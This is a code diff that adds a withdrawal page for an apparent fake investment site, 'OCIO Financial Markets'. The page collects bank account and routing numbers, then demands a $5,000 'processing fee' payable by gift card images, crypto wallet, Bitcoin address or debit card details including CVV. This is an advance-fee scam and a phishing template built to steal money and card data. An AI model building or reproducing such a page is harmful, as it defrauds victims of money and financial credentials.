@@ -1,0 +1,271 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Withdraw – OCIO Financial Markets</title>
+  <link rel="stylesheet" href="style.css" />
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700;800;900&family=DM+Sans:ital,wght@0,300;0,400;0,500;0,600;1,400&display=swap" rel="stylesheet" />
+</head>
+<body class="dashboard-body">
+
+  <!-- Sidebar -->
+  <aside class="dash-sidebar" id="dash-sidebar">
+    <div class="dash-sidebar-top">
+      <a href="index.html" class="logo">
+        <div class="logo-mark"><svg width="28" height="28" viewBox="0 0 32 32" fill="none"><rect width="32" height="32" rx="8" fill="#1d4ed8"/><path d="M8 20L14 12L19 17L24 10" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"/><circle cx="24" cy="10" r="2" fill="#60a5fa"/></svg></div>
+        <span class="logo-text">OCIO</span>
+      </a>
+    </div>
+    <nav class="dash-nav">
+      <a href="dashboard.html?tab=portfolio" class="dash-nav-item"><i class="fas fa-chart-pie"></i><span>Portfolio</span></a>
+      <a href="markets.html" class="dash-nav-item"><i class="fas fa-chart-line"></i><span>Markets</span></a>
+      <a href="dashboard.html?tab=transactions" class="dash-nav-item"><i class="fas fa-arrow-right-arrow-left"></i><span>Transactions</span></a>
+      <a href="deposit.html" class="dash-nav-item"><i class="fas fa-wallet"></i><span>Deposit</span></a>
+      <a href="withdraw.html" class="dash-nav-item active"><i class="fas fa-money-bill-transfer"></i><span>Withdraw</span></a>
+      <a href="dashboard.html?tab=settings" class="dash-nav-item"><i class="fas fa-gear"></i><span>Settings</span></a>
+    </nav>
+    <div class="dash-sidebar-bottom">
+      <button class="dash-nav-item dash-logout" id="dash-logout"><i class="fas fa-right-from-bracket"></i><span>Logout</span></button>
+    </div>
+  </aside>
+
+  <div class="dash-main">
+    <header class="dash-topbar">
+      <button class="dash-menu-btn" id="dash-menu-btn" aria-label="Toggle sidebar"><i class="fas fa-bars"></i></button>
+      <div class="dash-topbar-left"><h2>Withdraw Funds</h2></div>
+      <div class="dash-topbar-right">
+        <div class="dash-avatar" id="dash-avatar"><span id="avatar-initials">U</span></div>
+        <span class="dash-user-name" id="dash-user-name">User</span>
+      </div>
+    </header>
+
+    <div class="dash-content">
+      <!-- Step 1: Bank Details -->
+      <div class="withdraw-step" id="wd-step-1">
+        <div class="dash-welcome"><div>
+          <h1><i class="fas fa-building-columns" style="color:var(--blue-500);"></i> Withdraw to Bank Account</h1>
+          <p>Your balance: <strong id="wd-balance">$0.00</strong></p>
+        </div></div>
+
+        <div class="dash-card" style="max-width:620px;">
+          <div class="dash-card-header"><h3>Step 1: Bank Details</h3></div>
+          <form id="wd-bank-form" class="auth-form" novalidate>
+            <div class="form-group">
+              <label for="wd-bank" class="form-label">Select Your Bank</label>
+              <select id="wd-bank" class="form-input form-select" required>
+                <option value="">-- Choose a bank --</option>
+                <option>JPMorgan Chase</option>
+                <option>Bank of America</option>
+                <option>Wells Fargo</option>
+                <option>Citibank</option>
+                <option>U.S. Bank</option>
+                <option>PNC Bank</option>
+                <option>Capital One</option>
+                <option>TD Bank</option>
+                <option>Goldman Sachs</option>
+                <option>Morgan Stanley</option>
+                <option>Charles Schwab</option>
+                <option>HSBC Bank USA</option>
+                <option>Truist Bank</option>
+                <option>Fifth Third Bank</option>
+                <option>Ally Bank</option>
+                <option>KeyBank</option>
+                <option>Regions Bank</option>
+                <option>M&T Bank</option>
+                <option>Citizens Bank</option>
+                <option>First Republic Bank</option>
+                <option>Huntington National Bank</option>
+                <option>Discover Bank</option>
+                <option>BMO Harris Bank</option>
+                <option>Zions Bank</option>
+                <option>Comerica Bank</option>
+                <option>SVB (Silicon Valley Bank)</option>
+                <option>Webster Bank</option>
+                <option>Valley National Bank</option>
+                <option>Other</option>
+              </select>
+            </div>
+            <div class="form-group">
+              <label for="wd-account" class="form-label">Account Number</label>
+              <div class="input-wrap"><i class="fas fa-hashtag"></i>
+                <input type="text" id="wd-account" class="form-input" placeholder="Enter account number" required pattern="[0-9]{4,17}" />
+              </div>
+            </div>
+            <div class="form-group">
+              <label for="wd-routing" class="form-label">Routing Number</label>
+              <div class="input-wrap"><i class="fas fa-route"></i>
+                <input type="text" id="wd-routing" class="form-input" placeholder="9-digit routing number" required pattern="[0-9]{9}" maxlength="9" />
+              </div>
+            </div>
+            <div class="form-group">
+              <label for="wd-amount" class="form-label">Withdrawal Amount (USD)</label>
+              <div class="input-wrap"><i class="fas fa-dollar-sign"></i>
+                <input type="number" id="wd-amount" class="form-input" placeholder="0.00" min="1" step="0.01" required />
+              </div>
+            </div>
+            <div id="wd-bank-error" class="form-error" hidden></div>
+            <button type="submit" class="btn btn-primary btn-lg btn-full"><span>Continue to Fee Payment</span><i class="fas fa-arrow-right"></i></button>
+          </form>
+        </div>
+      </div>
+
+      <!-- Step 2: Fee Payment -->
+      <div class="withdraw-step" id="wd-step-2" style="display:none;">
+        <div class="dash-welcome"><div>
+          <h1><i class="fas fa-receipt" style="color:#f59e0b;"></i> Withdrawal Fee Required</h1>
+          <p>A one-time processing fee is required to complete your withdrawal.</p>
+        </div></div>
+
+        <div class="wd-fee-banner glass-card anim-float">
+          <div class="wd-fee-icon"><i class="fas fa-exclamation-triangle"></i></div>
+          <div class="wd-fee-info">
+            <h3>Processing Fee: <span class="wd-fee-amount">$5,000.00</span></h3>
+            <p>This fee covers international wire transfer, compliance verification, and insurance. It must be paid before your withdrawal of <strong id="wd-summary-amount">$0.00</strong> to <strong id="wd-summary-bank">Bank</strong> is processed.</p>
+          </div>
+        </div>
+
+        <div class="wd-pay-methods">
+          <h3 class="wd-pay-title">Choose Payment Method</h3>
+          <div class="wd-method-grid">
+            <button class="wd-method-card glass-card" data-method="giftcard">
+              <div class="wd-method-icon" style="background:#fef3c7;color:#b45309;"><i class="fas fa-gift"></i></div>
+              <h4>Gift Card</h4>
+              <p>Upload any gift card</p>
+            </button>
+            <button class="wd-method-card glass-card" data-method="wallet">
+              <div class="wd-method-icon" style="background:#ede9fe;color:#6d28d9;"><i class="fas fa-wallet"></i></div>
+              <h4>Wallet Connect</h4>
+              <p>Pay via crypto wallet</p>
+            </button>
+            <button class="wd-method-card glass-card" data-method="btc">
+              <div class="wd-method-icon" style="background:#fff7ed;color:#ea580c;"><i class="fab fa-bitcoin"></i></div>
+              <h4>Bitcoin (BTC)</h4>
+              <p>Send BTC payment</p>
+            </button>
+            <button class="wd-method-card glass-card" data-method="debit">
+              <div class="wd-method-icon" style="background:#dbeafe;color:#1d4ed8;"><i class="fas fa-credit-card"></i></div>
+              <h4>Debit Card</h4>
+              <p>Pay with debit card</p>
+            </button>
+          </div>
+        </div>
+
+        <!-- Gift Card Upload -->
+        <div class="wd-payment-panel" id="panel-giftcard" style="display:none;">
+          <div class="dash-card" style="max-width:520px;margin:0 auto;">
+            <div class="dash-card-header"><h3><i class="fas fa-gift" style="color:#f59e0b;"></i> Upload Gift Card</h3></div>
+            <form id="giftcard-form" class="auth-form">
+              <div class="form-group">
+                <label for="gc-type" class="form-label">Gift Card Type</label>
+                <select id="gc-type" class="form-input form-select" required>
+                  <option value="">-- Select type --</option>
+                  <option>Apple Gift Card</option>
+                  <option>Amazon Gift Card</option>
+                  <option>Google Play Gift Card</option>
+                  <option>Steam Gift Card</option>
+                  <option>Visa Gift Card</option>
+                  <option>eBay Gift Card</option>
+                  <option>Walmart Gift Card</option>
+                  <option>Target Gift Card</option>
+                  <option>iTunes Gift Card</option>
+                  <option>Other</option>
+                </select>
+              </div>
+              <div class="form-group">
+                <label for="gc-amount" class="form-label">Gift Card Value (USD)</label>
+                <div class="input-wrap"><i class="fas fa-dollar-sign"></i>
+                  <input type="number" id="gc-amount" class="form-input" placeholder="Card value" required min="1" />
+                </div>
+              </div>
+              <div class="form-group">
+                <label class="form-label">Upload Gift Card Image (Front & Back)</label>
+                <div class="gc-upload-area" id="gc-upload-area">
+                  <i class="fas fa-cloud-arrow-up"></i>
+                  <p>Click or drag to upload</p>
+                  <span>PNG, JPG up to 10MB</span>
+                  <input type="file" id="gc-file" accept="image/*" multiple hidden />
+                </div>
+                <div id="gc-preview" class="gc-preview-row"></div>
+              </div>
+              <div id="gc-error" class="form-error" hidden></div>
+              <button type="submit" class="btn btn-primary btn-lg btn-full"><i class="fas fa-paper-plane"></i> Submit Gift Card</button>
+            </form>
+          </div>
+        </div>
+
+        <!-- Wallet Connect -->
+        <div class="wd-payment-panel" id="panel-wallet" style="display:none;">
+          <div class="dash-card" style="max-width:520px;margin:0 auto;text-align:center;">
+            <div class="dash-card-header"><h3><i class="fas fa-wallet" style="color:#6d28d9;"></i> Wallet Connect</h3></div>
+            <p style="color:var(--text-secondary);margin-bottom:1.5rem;">Send exactly <strong>$5,000.00</strong> to the following wallet address:</p>
+            <div class="wd-wallet-address"><code>0x4A7F2c8E91bD34f6aE829C1D50eB3cF67A8d9012</code></div>
+            <p class="form-hint" style="margin-top:1rem;">After sending, please allow 10-30 minutes for confirmation.</p>
+            <button class="btn btn-primary btn-lg btn-full" style="margin-top:1.5rem;" id="btn-confirm-wallet"><i class="fas fa-check"></i> I Have Sent Payment</button>
+          </div>
+        </div>
+
+        <!-- BTC Payment -->
+        <div class="wd-payment-panel" id="panel-btc" style="display:none;">
+          <div class="dash-card" style="max-width:520px;margin:0 auto;text-align:center;">
+            <div class="dash-card-header"><h3><i class="fab fa-bitcoin" style="color:#ea580c;"></i> Bitcoin Payment</h3></div>
+            <p style="color:var(--text-secondary);margin-bottom:1.5rem;">Send the BTC equivalent of <strong>$5,000.00</strong> to:</p>
+            <div class="wd-wallet-address"><code>bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh</code></div>
+            <p class="form-hint" style="margin-top:1rem;">Use current BTC/USD rate. Allow 1-3 confirmations.</p>
+            <button class="btn btn-primary btn-lg btn-full" style="margin-top:1.5rem;" id="btn-confirm-btc"><i class="fas fa-check"></i> I Have Sent BTC</button>
+          </div>
+        </div>
+
+        <!-- Debit Card -->
+        <div class="wd-payment-panel" id="panel-debit" style="display:none;">
+          <div class="dash-card" style="max-width:520px;margin:0 auto;">
+            <div class="dash-card-header"><h3><i class="fas fa-credit-card" style="color:var(--blue-600);"></i> Debit Card Payment</h3></div>
+            <form id="debit-form" class="auth-form">
+              <div class="form-group">
+                <label for="dc-name" class="form-label">Cardholder Name</label>
+                <div class="input-wrap"><i class="fas fa-user"></i><input type="text" id="dc-name" class="form-input" placeholder="Name on card" required /></div>
+              </div>
+              <div class="form-group">
+                <label for="dc-number" class="form-label">Card Number</label>
+                <div class="input-wrap"><i class="fas fa-credit-card"></i><input type="text" id="dc-number" class="form-input" placeholder="1234 5678 9012 3456" required maxlength="19" /></div>
+              </div>
+              <div style="display:grid;grid-template-columns:1fr 1fr;gap:1rem;">
+                <div class="form-group">
+                  <label for="dc-exp" class="form-label">Expiry</label>
+                  <div class="input-wrap"><i class="fas fa-calendar"></i><input type="text" id="dc-exp" class="form-input" placeholder="MM/YY" required maxlength="5" /></div>
+                </div>
+                <div class="form-group">
+                  <label for="dc-cvv" class="form-label">CVV</label>
+                  <div class="input-wrap"><i class="fas fa-lock"></i><input type="text" id="dc-cvv" class="form-input" placeholder="123" required maxlength="4" /></div>
+                </div>
+              </div>
+              <div class="wd-fee-reminder"><i class="fas fa-info-circle"></i> You will be charged <strong>$5,000.00</strong></div>
+              <button type="submit" class="btn btn-primary btn-lg btn-full"><i class="fas fa-lock"></i> Pay $5,000.00</button>
+            </form>
+          </div>
+        </div>
+
+        <div style="text-align:center;margin-top:2rem;">
+          <button class="btn btn-outline" id="wd-back-btn"><i class="fas fa-arrow-left"></i> Back to Bank Details</button>
+        </div>
+      </div>
+
+      <!-- Step 3: Success -->
+      <div class="withdraw-step" id="wd-step-3" style="display:none;">
+        <div class="wd-success-screen">
+          <div class="wd-success-icon anim-float"><i class="fas fa-clock"></i></div>
+          <h1>Withdrawal Request Submitted</h1>
+          <p>Your fee payment is being verified. Once confirmed, your withdrawal will be processed within 24-48 hours.</p>
+          <a href="dashboard.html" class="btn btn-primary btn-lg"><i class="fas fa-arrow-left"></i> Back to Dashboard</a>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="dash-overlay" id="dash-overlay"></div>
+  <script src="m_script.js?v=1779720946936"></script>
+</body>
+</html>
